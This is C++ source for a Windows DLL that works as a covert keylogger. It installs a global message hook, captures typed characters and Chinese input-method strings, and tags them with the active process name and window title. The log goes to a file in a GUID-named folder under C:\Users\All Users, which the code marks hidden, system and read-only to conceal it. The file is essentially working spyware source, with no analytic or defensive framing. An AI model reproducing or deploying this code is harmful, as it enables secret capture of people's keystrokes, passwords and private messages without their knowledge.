// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include<stdio.h>
#include <tlhelp32.h>
#include <windows.h>
#include   "imm.h"     
#pragma   comment(lib,"imm32")  
HINSTANCE g_hInstance = NULL;
HHOOK Kg_hHook = NULL;
char Buff[10] = { 0 };
char ProNameOld[64];
char ProNameNew[64];
DWORD OldTime;
DWORD NewTime;
BOOL flag = 0; 
HWND         LastFocusWnd = 0;
HWND         FocusWnd;
long lastFileSize=0;

int DataToFile(char* buff)
{
	//////
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
	if (GetLastError() == 3)
	{
		CreateDirectory("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}", NULL);
		SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
	}
	HANDLE hFil = CreateFile("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//HANDLE hFil = CreateFile("d:\\data.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFil == INVALID_HANDLE_VALUE)
	{
		int a;
		a = GetLastError();
		char buf[10];
		wsprintf(buf, "%d", a);
		//MessageBox(NULL, "Createfile error", buf, 0);
		//printf("createfile error\n");
		return 0;
	}
	if (SetFilePointer(hFil, 0, NULL, FILE_END) == -1)
	{
		MessageBox(NULL, "setfilePointer error", "a", 0);
		printf("setfilePointer error\n");
		return 0;
	}
	DWORD dwWrite;
	if (!WriteFile(hFil, buff, strlen(buff), &dwWrite, NULL))
	{
		MessageBox(NULL, "WriteFile error", "a", 0);
		printf("WriteFile error\n");
		return 0;
	}
	lastFileSize = GetFileSize(hFil,NULL);
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	CloseHandle(hFil);
	return 0;
}
void writtitle()
{//保存当前窗口  
	char title[256];
	FocusWnd = GetActiveWindow(); 
	if (LastFocusWnd != FocusWnd)
	{
		
		GetWindowText(FocusWnd, title, 256);  //当前窗口标题  
		LastFocusWnd = FocusWnd;
		DataToFile("\r\n-------");
		DataToFile(title);
		DataToFile("\r\n");
	}
}
int GetProcess(DWORD pidNum,char * buff)
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed");
		return 0;
	}
	//循环列举进程
	BOOL bMore = Process32First(hProcessSnap, &pe32);
	while (bMore)
	{
		if (pe32.th32ProcessID == pidNum)
		{
			wsprintf(buff, "%s", pe32.szExeFile);
			break;
		}
		else
		{
			bMore = Process32Next(hProcessSnap, &pe32);
		}
	}
	CloseHandle(hProcessSnap);
	return 0;
}
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	//MessageBox(NULL, "ASD", "ASD", 0);
	if (nCode < 0)
	{
		return CallNextHookEx(Kg_hHook, nCode, wParam, lParam);
	}
	//DataToFile("okokok");
	if (nCode == HC_ACTION)
	{
		MSG *pEventMsg = (MSG*)lParam;
		/*
		if ((pEventMsg->message !=0xc2d4)&& (pEventMsg->message != 0xc2d1) && (pEventMsg->message != 0xc202) && (pEventMsg->message != 0x401) && (pEventMsg->message != 0x200) && (pEventMsg->message != 0x113) && (pEventMsg->message !=0x401))
		{
			char bu[256];
			wsprintf(bu, "Message :%x \n\r", pEventMsg->message);
			DataToFile(bu);
			WM_SETFOCUS
		}
		*/

		/*
		if (pEventMsg->message == WM_SETFOCUS || pEventMsg->message == WM_KILLFOCUS)
		{
			DataToFile("asd");
		}
		*/
		//MessageBox(NULL, bu, "asd", 0);

		if (pEventMsg->message == WM_CHAR)
		{
			//MessageBox(NULL, "asd", "asd",0);

			/*
			char bu[256];
			char a = pEventMsg->wParam;
			wsprintf(bu, "char :%d time %d\n\r", a,pEventMsg->time);
			MessageBox(NULL, bu, "asd", 0);
			DataToFile(bu);
			*/

			memset(Buff, 0, 10);
			Buff[0] = pEventMsg->wParam;
			NewTime = pEventMsg->time;
			if (OldTime != NewTime)
			{
				OldTime = NewTime;
				if (Buff[0] >= 0 && Buff[0] < 128)
				{
					DataToFile(Buff);
				}
			
			}
			
		}
		else if (pEventMsg->message == WM_KEYDOWN)
		{
			/*
			int vKey = pEventMsg->wParam;
			char ch;
			char str[10];
			char bu[15];
			memset(Buff, 0, 10);
			memset(str, 0, 10);
			//memset(ProNameOld, 0, 64);
			//memset(ProNameNew, 0, 64);
			*/
			memset(Buff, 0, 10);
			int vKey = pEventMsg->wParam;
			DWORD qqq;
			GetWindowThreadProcessId(pEventMsg->hwnd, &qqq);
			GetProcess(qqq, ProNameNew);

			
			
			if (strcmp(ProNameNew, ProNameOld) != 0)
			{
				strcpy(ProNameOld, ProNameNew);
				DataToFile("\r\n\r\n");
				DataToFile(ProNameOld);
				DataToFile("*****************************");
			}
			writtitle();
			//////////////////////////
			SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
			if (GetLastError() == 3)
			{
				CreateDirectory("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}", NULL);
				SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
			}
			HANDLE hFil = CreateFile("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			long a = GetFileSize(hFil, NULL);
			SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
			CloseHandle(hFil);
		/*	HANDLE hFil = CreateFile("d:\\data.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			long a = GetFileSize(hFil, NULL);
			CloseHandle(hFil);
			*/
			if (lastFileSize != a)
			{
				DataToFile("\r\n\r\n");
				DataToFile(ProNameOld);
				DataToFile("*****************************");
				LastFocusWnd = 0;
				writtitle();
			}
			
			switch (vKey)
			{
				case 13:
				{
					strcpy(Buff, "\r\n");
					DataToFile(Buff);
					break;
				}
				default:break;
			}
			//Sleep(100);
			
			/*
			const int KeyMask= 0x80000000;
			int iShift = GetKeyState(0x10);
			int iCapital = GetKeyState(0x14);
			int iNumLock = GetKeyState(0x90);
			bool bShift = ((iShift & KeyMask) == KeyMask);
			bool bCapital = ((iCapital & 1) == 1);
			bool bNumLock = ((iNumLock & 1) == 1);

			
			wsprintf(bu, "%d", vKey);
			MessageBox(NULL, bu, "asd", 0);
			if (vKey >= 48 && vKey <= 57)
			{
				switch (vKey)
				{
				case 48:
					if (!bShift)
						ch = '0';
					else
						ch = ')';
					break;
				case 49:
					if (!bShift)
						ch = '1';
					else
						ch = '!';
					break;
				case 50:
					if (!bShift)
						ch = '2';
					else
						ch = '@';
					break;
				case 51:
					if (!bShift)
						ch = '3';
					else
						ch = '#';
					break;
				case 52:
					if (!bShift)
						ch = '4';
					else
						ch = '$';
					break;
				case 53:
					if (!bShift)
						ch = '5';
					else
						ch = '%';
					break;
				case 54:
					if (!bShift)
						ch = '6';
					else
						ch = '^';
					break;
				case 55:
					if (!bShift)
						ch = '7';
					else
						ch = '&';
					break;
				case 56:
					if (!bShift)
						ch = '8';
					else
						ch = '*';
					break;
				case 57:
					if (!bShift)
						ch = '9';
					else
						ch = '(';
					break;
				}
				Buff[0] = ch;
				DataToFile(Buff);
			}
			if (vKey >= 65 && vKey <= 90)
			{
				if (!bCapital)
				{
					if (bShift)
						ch = vKey;
					else
						ch = vKey + 32;
				}
				else
				{
					if (bShift)
						ch = vKey + 32;
					else
						ch = vKey;
				}
				Buff[0] = ch;
				DataToFile(Buff);
			}
			if (vKey >= 96 && vKey <= 105)
			{
				if (bNumLock)
				{
					switch (vKey)
					{
					case 96:
						ch = '0';
						break;
					case 97:
						ch = '1';
						break;
					case 98:
						ch = '2';
						break;
					case 99:
						ch = '3';
						break;
					case 100:
						ch = '4';
						break;
					case 101:
						ch = '5';
						break;
					case 102:
						ch = '6';
						break;
					case 103:
						ch = '7';
						break;
					case 104:
						ch = '8';
						break;
					case 105:
						ch = '9';
						break;
					}
					Buff[0] = ch;
					DataToFile(Buff);
				}
			}
			if (vKey >= 186 && vKey <= 222)
			{
				switch (vKey)
				{
				case 186:if (!bShift) ch = ';'; else ch = ':'; break;
				case 187:if (!bShift) ch = '='; else ch = '+'; break;
				case 188:if (!bShift) ch = ','; else ch = '<'; break;
				case 189:if (!bShift) ch = '-'; else ch = '_'; break;
				case 190:if (!bShift) ch = '.'; else ch = ' >'; break;
				case 191:if (!bShift) ch = '/'; else ch = '?'; break;
				case 192:if (!bShift) ch = '`'; else ch = '~'; break;
				case 219:if (!bShift) ch = '['; else ch = '{'; break;
				case 220:if (!bShift) ch = '\\'; else ch = '|'; break;
				case 221:if (!bShift) ch = ']'; else ch = '}'; break;
				case 222:if (!bShift) ch = '\''; else ch = '\"'; break;
				default:break;
				}
				Buff[0] = ch;
				DataToFile(Buff);
			}
			switch (vKey)
			{
			case 8:
			{
				strcpy(Buff, " ");
				DataToFile(Buff);
				break;
			}
			case 13:
			{
				strcpy(Buff, "\n");
				DataToFile(Buff);
				break;
			}
			default:break;
			}
			*/
		}
		else if(pEventMsg->message == WM_IME_COMPOSITION)
		{
			NewTime = pEventMsg->time;
			if (OldTime != NewTime)
			{
				OldTime = NewTime;
				HIMC hIMC;
				HWND hWnd = pEventMsg->hwnd;
				DWORD dwSize;
				char lpstr[20];
				if (pEventMsg->lParam & GCS_RESULTSTR)
				{
					//先获取当前正在输入的窗口的输入法句柄  
					hIMC = ImmGetContext(hWnd);
					// 先将ImmGetCompositionString的获取长度设为0来获取字符串大小.  
					dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);

					// 缓冲区大小要加上字符串的NULL结束符大小,  
					//   考虑到UNICODE  
					dwSize += sizeof(WCHAR);

					memset(lpstr, 0, 20);
					// 再调用一次.ImmGetCompositionString获取字符串  
					ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);
					//现在lpstr里面即是输入的汉字了。  
					DataToFile(lpstr);  //保存为文件  
					ImmReleaseContext(hWnd, hIMC);
				}
			}
		}
			
	}
	return CallNextHookEx(Kg_hHook, nCode, wParam, lParam);
}
BOOL StartHook()
{
	//DataToFile("Start Hook \n\r");
	//MessageBox(NULL, "ASD", "ASD", 0);
	if (Kg_hHook != NULL)
		return FALSE;
	Kg_hHook = SetWindowsHookEx(WH_GETMESSAGE, KeyHookProc, g_hInstance, NULL);
	
	return TRUE;
}
BOOL StopHook()
{
//	DataToFile("Stop Hook \n\r");
	if (Kg_hHook != NULL)
	{
		if (!UnhookWindowsHookEx(Kg_hHook))
		{
			return FALSE;
		}
		Kg_hHook = NULL;
	}
	return TRUE;
}
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	g_hInstance = (HINSTANCE)hModule;
//	DWORD dwThreadId;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		if (Kg_hHook != NULL)
		{
			UnhookWindowsHookEx(Kg_hHook);
		}
		break;
	case DLL_PROCESS_DETACH:
		if (Kg_hHook != NULL)
		{
			UnhookWindowsHookEx(Kg_hHook);
		}
		break;
	}
	return TRUE;
}